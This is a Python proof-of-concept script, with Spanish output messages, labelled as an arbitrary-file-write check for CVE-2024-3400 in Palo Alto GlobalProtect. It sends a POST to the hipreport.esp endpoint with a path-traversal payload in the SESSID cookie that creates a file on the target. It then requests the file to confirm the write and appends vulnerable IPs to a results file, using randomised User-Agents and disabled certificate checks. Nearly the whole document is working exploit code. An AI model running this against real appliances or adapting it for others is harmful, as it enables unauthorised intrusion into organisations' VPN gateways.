import argparse
import requests
from fake_useragent import UserAgent
import sys
import warnings
import urllib3

def enviar_primera_consulta(IP, PORT, FILE, verbose):
    ua = UserAgent()
    user_agent = ua.random
    url = f"https://{IP}:{PORT}/ssl-vpn/hipreport.esp"
    cookie = f"SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/{FILE}"
    headers = {
        "Host": IP,
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "close",
        "Cookie": cookie,
        "User-Agent": user_agent
    }
    with warnings.catch_warnings():
        warnings.filterwarnings("ignore", category=urllib3.exceptions.InsecureRequestWarning)
        response = requests.post(url, headers=headers, verify=False)
    if verbose:
        print("[POST Request]")
        print("URL:", url)
        print("Method: POST")
        print("Headers:", headers)
        print("Cookie:", cookie)
        print("User-Agent:", user_agent)
        print("Body:", "<No body>")
        print("Response:")
        print(response.text)
    if response.status_code != 200 or "Missing or invalid required input parameters" not in response.text:
        print("\033[91m[-] No vulnerable o el asset no corresponde\033[0m")
        return False
    print("[+] Primer consulta enviada\n[+] Chequeando si existe el archivo")
    return True

def chequear_archivo(IP, PORT, FILE, output_file, verbose):
    url = f"https://{IP}/global-protect/portal/images/{FILE}"
    headers = {
        "Host": IP,
        "Connection": "close"
    }
    with warnings.catch_warnings():
        warnings.filterwarnings("ignore", category=urllib3.exceptions.InsecureRequestWarning)
        response = requests.get(url, headers=headers, verify=False)
    if verbose:
        print("[GET Request]")
        print("URL:", url)
        print("Method: GET")
        print("Headers:", headers)
        print("Response:")
        print(response.text)
    if response.status_code == 403:
        print(f"\033[92m[+] Archivo creado, asset vulnerable: {IP}\033[0m")
        if output_file:
            with open(output_file, "a") as f:
                f.write(f"{IP}\n")
    elif response.status_code == 404:
        print(f"\033[91m[-] Archivo no encontrado, asset no vulnerable: {IP}\033[0m")

def main():
    print("CVE-2024-3400 - Arbitrary File Write exploit check")
    print("By @merlax_\n")

    parser = argparse.ArgumentParser(description="Script para enviar consultas y chequear la vulnerabilidad de un asset")
    parser.add_argument("-i", "--IP", help="Direcci√≥n IP del host", required=True)
    parser.add_argument("-p", "--PORT", help="Puerto del host", default="443")
    parser.add_argument("-f", "--FILE", help="Nombre del archivo a crear", default="poc.txt")
    parser.add_argument("-o", "--output", help="Guardar en archivo los hosts vulnerables", default="resultado.txt")
    parser.add_argument("-v", "--verbose", help="Para ver info del request/response", action="store_true")
    args = parser.parse_args()

    IP = args.IP
    PORT = args.PORT
    FILE = args.FILE
    output_file = args.output
    verbose = args.verbose

    if not enviar_primera_consulta(IP, PORT, FILE, verbose):
        sys.exit(1)

    chequear_archivo(IP, PORT, FILE, output_file, verbose)

if __name__ == "__main__":
    main()
